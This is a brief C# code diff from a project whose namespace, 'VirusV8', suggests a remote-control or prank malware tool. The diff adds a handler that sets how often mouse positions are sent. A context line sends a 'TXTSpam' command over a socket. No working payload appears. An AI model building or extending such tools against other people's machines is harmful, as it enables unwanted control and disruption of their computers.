@@ -247,5 +247,10 @@ namespace VirusV8
             byte[] bytes = Encoding.ASCII.GetBytes("TXTSpam");
             s.send(bytes);
         }
+
+        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
+        {
+            timerSendMousePosition.Interval = Convert.ToInt32(numericUpDown1.Value);
+        }
     }
 }
